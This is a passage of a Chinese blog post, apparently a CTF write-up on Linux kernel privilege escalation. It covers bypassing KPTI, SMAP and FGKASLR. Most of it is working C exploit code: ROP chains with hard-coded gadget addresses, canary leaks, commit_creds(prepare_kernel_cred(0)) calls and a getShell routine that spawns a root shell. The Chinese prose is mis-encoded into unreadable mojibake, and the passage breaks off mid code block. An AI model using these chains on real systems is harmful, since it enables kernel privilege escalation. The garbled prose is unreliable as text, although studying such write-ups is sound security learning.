çš„ä½ç½®ï¼Œè¿™ä¸¤ä¸ª 0dummy æ˜¯å ä½ï¼Œå¹¶ä¸æ˜¯æ‰€è¯´çš„ä¸¤ä¸ª popã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload[off++] = kpti_trampoline;</span><br><span class=\"line\">payload[off++] = <span class=\"number\">0</span>;                  &lt;- rsp </span><br><span class=\"line\">payload[off++] = <span class=\"number\">0</span>;                   </span><br><span class=\"line\">payload[off++] = ret;</span><br><span class=\"line\">payload[off++] = user_cs;</span><br><span class=\"line\">payload[off++] = user_rflags;</span><br><span class=\"line\">payload[off++] = user_sp;</span><br><span class=\"line\">payload[off++] = user_ss;</span><br></pre></td></tr></table></figure>\n<p>[[swapgs_restore_regs_and_return_to_usermode]]</p>\n<p>ç”¨æˆ·æ€è¿›å…¥å†…æ ¸æ€ä¼šè°ƒç”¨ <code>SWITCH_KERNEL_CR3_NO_STACK</code>  ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€<br>\nä¹Ÿå°±æ˜¯æ¸…é›¶ 12 ä½å’Œ 13 ä½</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov     rdi, cr3</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">and     rdi, <span class=\"number\">0xFFFFFFFFFFFFE7FF</span></span><br><span class=\"line\">mov     cr3, rdi</span><br></pre></td></tr></table></figure>\n<p>è€Œåœ¨ä»å†…æ ¸æ€è¿”å›ç”¨æˆ·æ€æ—¶ä¼šè°ƒç”¨  <code>SWITCH_USER_CR3</code>  å®æ¥åˆ‡æ¢  <code>CR3</code> ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov     rdi, cr3</span><br><span class=\"line\">or      rdi, <span class=\"number\">1000</span>h</span><br><span class=\"line\">mov     cr3, rdi</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp1-trampoline\"><a class=\"markdownIt-Anchor\" href=\"#exp1-trampoline\">#</a> exp1 - trampoline</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">u64 kernel_base              = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">u64 pop_rdx_ret              = <span class=\"number\">0xffffffff81007616</span>; <span class=\"comment\">// pop rdx ; ret</span></span><br><span class=\"line\">u64 cmp_rdx_jne_pop2_ret     = <span class=\"number\">0xffffffff81964cc4</span>; <span class=\"comment\">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">u64 mov_rdi_rax_jne_pop2_ret = <span class=\"number\">0xffffffff8166fea3</span>; <span class=\"comment\">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">u64 pop_rdi_ret              = <span class=\"number\">0xffffffff81006370</span>; <span class=\"comment\">// pop rdi ; ret</span></span><br><span class=\"line\">u64 swapgs_pop1_ret          = <span class=\"number\">0xffffffff8100a55f</span>; <span class=\"comment\">// not found </span></span><br><span class=\"line\">u64 iretq                    = <span class=\"number\">0xffffffff8100c0d9</span>; <span class=\"comment\">// iretq</span></span><br><span class=\"line\">u64 mov_esp_pop2_ret         = <span class=\"number\">0xffffffff8196f56a</span>; <span class=\"comment\">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br><span class=\"line\">u64 kpti_trampoline          = <span class=\"number\">0xffffffff81200f10</span>+<span class=\"number\">22</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">0x80</span>];</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"string\">&#x27;\\xff&#x27;</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  wtk(buf, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;Bypass kpti&quot;</span>);</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = pkc;</span><br><span class=\"line\">  payload[off++] = pop_rdx_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">8</span>;</span><br><span class=\"line\">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class=\"comment\">// make test branch not reach</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = cc;</span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>; <span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>; <span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = getShell;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  <span class=\"comment\">// StackPivot(canary);</span></span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp2-signal-sigsegv\"><a class=\"markdownIt-Anchor\" href=\"#exp2-signal-sigsegv\">#</a> exp2 - signal SIGSEGV</h2>\n<p>åœ¨å¼€å¯ KPTI å†…æ ¸ï¼Œææƒè¿”å›åˆ°ç”¨æˆ·æ€ï¼ˆiretq/sysretï¼‰ä¹‹å‰å¦‚æœä¸è®¾ç½® CR3 å¯„å­˜å™¨çš„å€¼ï¼Œ<br>\nå°±ä¼šå¯¼è‡´è¿›ç¨‹æ‰¾ä¸åˆ°å½“å‰ç¨‹åºçš„æ­£ç¡®é¡µè¡¨ï¼Œå¼•å‘æ®µé”™è¯¯ï¼Œç¨‹åºé€€å‡ºã€‚<br>\nä¸è¿‡å¯ä»¥ç”¨ signal hook æ‰è¿™ä¸ªä¿¡å· å®ç° getshellã€‚<br>\nå…¶å®åªæ˜¯ç®€å•çš„åœ¨æ™®é€šæ²¡å¼€ KPTI çš„ <code>swapgs/iretq</code>  çš„åŸºç¡€ä¸ŠåŠ ä¸€è¡Œ <code>signal(SIGSEGV, getShell);</code>  å³å¯</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getShell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;get shell now&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;getShell failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  signal(SIGSEGV, getShell);</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  u64 kernel_base              = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">  u64 pop_rdx_ret              = <span class=\"number\">0xffffffff81007616</span>; <span class=\"comment\">// pop rdx ; ret</span></span><br><span class=\"line\">  u64 cmp_rdx_jne_pop2_ret     = <span class=\"number\">0xffffffff81964cc4</span>; <span class=\"comment\">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">  u64 mov_rdi_rax_jne_pop2_ret = <span class=\"number\">0xffffffff8166fea3</span>; <span class=\"comment\">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">  u64 pop_rdi_ret              = <span class=\"number\">0xffffffff81006370</span>; <span class=\"comment\">// pop rdi ; ret</span></span><br><span class=\"line\">  u64 swapgs_pop1_ret          = <span class=\"number\">0xffffffff8100a55f</span>; <span class=\"comment\">// not found </span></span><br><span class=\"line\">  u64 iretq                    = <span class=\"number\">0xffffffff8100c0d9</span>; <span class=\"comment\">// iretq</span></span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = pkc;</span><br><span class=\"line\">  payload[off++] = pop_rdx_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">8</span>;</span><br><span class=\"line\">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class=\"comment\">// make test branch not reach</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = cc;</span><br><span class=\"line\">  payload[off++] = swapgs_pop1_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = iretq;</span><br><span class=\"line\">  payload[off++] = getShell;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"å¢åŠ smap\"><a class=\"markdownIt-Anchor\" href=\"#å¢åŠ smap\">#</a> å¢åŠ  SMAP</h1>\n<p><strong>Supervisor Mode Access Prevention</strong><br>\nmarks all the userland pages in the page table as non-accessible when the process is in kernel-modeï¼Œ<br>\nby setting the  <code>21st bit</code>  of Control Register  <code>CR4</code> .</p>\n<p>å¯¹ç”¨æˆ·æ€çš„ä¸€åˆ‡è¯»å†™éƒ½å°†å¤±æ•ˆï¼Œ<br>\nå¯¹ ROP ä¾æ—§ä¹Ÿç”¨ï¼Œä½†æ˜¯æ ˆè¿ç§»ä¸è¡Œäº†</p>\n<h1 id=\"å†åŠ ä¸Škaslrä¿æŠ¤å¼€æ»¡\"><a class=\"markdownIt-Anchor\" href=\"#å†åŠ ä¸Škaslrä¿æŠ¤å¼€æ»¡\">#</a> å†åŠ ä¸Š KASLR ä¿æŠ¤å¼€æ»¡</h1>\n<p>å…¶å®æˆ‘è§‰å¾—å°±å¤šæ³„æ¼ä¸€ä¸ª base ä¹‹å¤–å’Œä¹‹å‰çš„ ROP æ²¡å•¥åŒºåˆ«äº†ï¼Œä¸è¿‡äº‹æƒ…æ²¡æˆ‘æƒ³çš„è¿™ä¹ˆç®€å•<br>\nè¿™é‡Œå…¶å®è¿˜æœ‰ä¸ªä¿æŠ¤ å«åš <code>Function Granular KASLR</code>  ä¼šæ‰“ä¹±å‡½æ•°åˆ°å†…æ ¸åŸºå€çš„åç§»ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢é‡åˆ°çš„ rearrange<br>\n<a href=\"https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/\">FGKASLR - CTF Wiki</a><br>\n æ ¹æ® wiki å’Œæ–‡ç«  å¯ä»¥å¾—çŸ¥</p>\n<ul>\n<li>__ksymtab ä¸ä¼šå‚ä¸éšæœºåŒ–</li>\n<li>.data ä¸ä¼šå‚ä¸éšæœºåŒ–</li>\n<li>The functions from  <code>_text</code>  base to  <code>__x86_retpoline_r15</code> , which is  <code>_text+0x400dc6</code>  are unaffected.<br>\n è¿™ä¸ªæ®µè½åŒ…æ‹¬</li>\n<li>swapgs_restore_regs_and_return_to_usermodeï¼Œè¯¥éƒ¨åˆ†çš„ä»£ç å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡ KPTI é˜²æŠ¤</li>\n<li>memcpy å†…å­˜æ‹·è´</li>\n<li>sync_regsï¼Œå¯ä»¥æŠŠ RAX æ”¾åˆ° RDI ä¸­</li>\n</ul>\n<p>ä¸ä¼šå‚ä¸éšæœºåŒ–çš„éƒ¨åˆ† æœ‰ä»¥ä¸‹çš„ gadgets</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">u64 pop_rax_ret = kernel_base + <span class=\"number\">0x4d11</span>; <span class=\"comment\">// pop rax; ret</span></span><br><span class=\"line\">u64 read_mem_pop1_ret = kernel_base + <span class=\"number\">0x4aae</span>; <span class=\"comment\">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class=\"line\">u64 pop_rdi_rbp_ret = kernel_base + <span class=\"number\">0x38a0</span>; <span class=\"comment\">// pop rdi; pop rbp; ret;</span></span><br></pre></td></tr></table></figure>\n<p>1 å’Œ 2 çš„ gadget æ„æˆäº†ä»»æ„åœ°å€è¯»å†™çš„ primitive<br>\n å¯¹äº <code>kernel_table</code> , å°±æ˜¯ <code>ksymtab</code>  é‡Œçš„æ¯ä¸€é¡¹ï¼Œè¿™ä¸ªåˆ°å†…æ ¸åŸºå€æ˜¯å›ºå®šçš„ã€‚<br>\nä»–è®°å½•çš„ç¬¦å·è¡¨çš„åç§»ï¼ˆé€šè¿‡ ksymtab çœ‹åˆ°çš„ï¼‰</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kernel_symbol</span> &#123;</span></span><br><span class=\"line\">\t  <span class=\"type\">int</span> value_offset;    [<span class=\"number\">1</span>] &lt;&lt;- çœŸæ­£æœ‰ç”¨çš„</span><br><span class=\"line\">\t  <span class=\"type\">int</span> name_offset;</span><br><span class=\"line\">\t  <span class=\"type\">int</span> namespace_offset;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>sync_regs å¦‚ä¸‹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0xffffffff8100aec0</span>:  push   rbp</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aec1</span>:  mov    rbp,rsp</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aec4</span>:  mov    rax,QWORD PTR gs:[rip+<span class=\"number\">0x7effb140</span>]        # <span class=\"number\">0x600c</span></span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aecc</span>:  sub    rax,<span class=\"number\">0xa8</span></span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aed2</span>:  cmp    rax,rdi</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aed5</span>:  je     <span class=\"number\">0xffffffff8100aee5</span></span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aed7</span>:  mov    rsi,rdi</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aeda</span>:  mov    ecx,<span class=\"number\">0x15</span></span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aedf</span>:  mov    rdi,rax                                     [<span class=\"number\">1</span>] &lt;&lt;- ä¸ªäººè§‰å¾—ä»è¿™é‡Œå¼€å§‹æ¯”è¾ƒå¥½</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aee2</span>:  rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aee5</span>:  pop    rbp</span><br><span class=\"line\"><span class=\"number\">0xffffffff8100aee6</span>:  ret </span><br></pre></td></tr></table></figure>\n<p>é€šè¿‡ä¸æ–­çš„è°ƒæ•´ä½ç½® æ‰“å°å¯»æ‰¾ ç»ˆäºæ‰¾åˆ°äº†åˆé€‚çš„åœ°å€ leak</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ $ ./exp </span><br><span class=\"line\">[+] saveState done</span><br><span class=\"line\">[+] open_dev() done</span><br><span class=\"line\">[*] rfk start</span><br><span class=\"line\">[+] rfk done</span><br><span class=\"line\">[*] canary is <span class=\"number\">0x9292ebeb2e24af00</span></span><br><span class=\"line\">p[<span class=\"number\">1</span>] : <span class=\"number\">0x19</span></span><br><span class=\"line\">p[<span class=\"number\">10</span>] : <span class=\"number\">0xffffffff8184e047</span></span><br><span class=\"line\">p[<span class=\"number\">11</span>] : <span class=\"number\">0xffffffff8184e047</span></span><br><span class=\"line\">p[<span class=\"number\">20</span>] : <span class=\"number\">0xffffffff816d51ff</span></span><br><span class=\"line\">p[<span class=\"number\">27</span>] : <span class=\"number\">0xffffffff816d5727</span></span><br><span class=\"line\">p[<span class=\"number\">28</span>] : <span class=\"number\">0xffffffff8152b8a1</span></span><br><span class=\"line\">p[<span class=\"number\">38</span>] : <span class=\"number\">0xffffffff8100a157</span>   &lt;&lt;- è¿™é€¼ä¸œè¥¿</span><br><span class=\"line\">p[<span class=\"number\">51</span>] : <span class=\"number\">0x19</span></span><br><span class=\"line\">p[<span class=\"number\">56</span>] : <span class=\"number\">0x3</span></span><br><span class=\"line\">p[<span class=\"number\">59</span>] : <span class=\"number\">0x33</span></span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œæ„é€ äº†ä¸¤ä¸ªåŸè¯­ ä¸€ä¸ªå®ç°ä»»æ„åœ°å€è¯»å†™çš„åŸè¯­ ä¸€ä¸ªå®ç°äº† f (x) çš„å‡½æ•°è°ƒç”¨çš„åŸè¯­ï¼Œ<br>\nåˆ†åˆ«æ˜¯ç”¨æ¥è¯»å– <code>ksymtab</code>  å’Œå®ç° <code>cc(pkc)</code>  çš„ã€‚</p>\n<h2 id=\"ä¸¤ä¸ªåŸè¯­\"><a class=\"markdownIt-Anchor\" href=\"#ä¸¤ä¸ªåŸè¯­\">#</a> ä¸¤ä¸ªåŸè¯­</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_addr_primitive</span><span class=\"params\">(<span class=\"type\">char</span> *addr, <span class=\"type\">void</span> (*f)())</span>&#123;</span><br><span class=\"line\">  u64 payload[<span class=\"number\">0x40</span>];</span><br><span class=\"line\">  u64 off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rax_ret;</span><br><span class=\"line\">  payload[off++] = addr - <span class=\"number\">0x10</span>;</span><br><span class=\"line\">  payload[off++] = read_mem_pop1_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rax</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy rdi</span></span><br><span class=\"line\">  payload[off++] = f;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œä¼šå°† rax ä½œä¸ºæŒ‡å®šå†…å­˜è¯»å‡ºæ¥çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ <code>kernel_symbol</code>  ä¸­çš„ <code>value_offset</code>  å€¼ï¼Œ<br>\nç„¶åå’Œå¯¹åº”çš„ <code>__ksymtab_symname</code>  çš„åœ°å€åŠ èµ·æ¥å°±æ˜¯æˆ‘ä»¬è¦çš„æœ€ç»ˆå‡½æ•°çš„åç§»ã€‚<br>\nç”±äºæ˜¯ rip ç›´æ¥åˆ‡æ¢ä¸º f æ²¡æœ‰åœ¨æ ˆä¸Šç•™ä¸‹è¿”å›åœ°å€ æ‰€ä»¥è¿™ä¸ªæ˜¯ä¸èƒ½è¿”å›çš„ ä¹Ÿå°±æ˜¯ Done è¿™ä¸ªå‡½æ•°å‹æ ¹æ‰§è¡Œä¸åˆ°ã€‚<br>\næ‰€ä»¥åªèƒ½å±‚å±‚é€’å½’å¥—å¨ƒã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 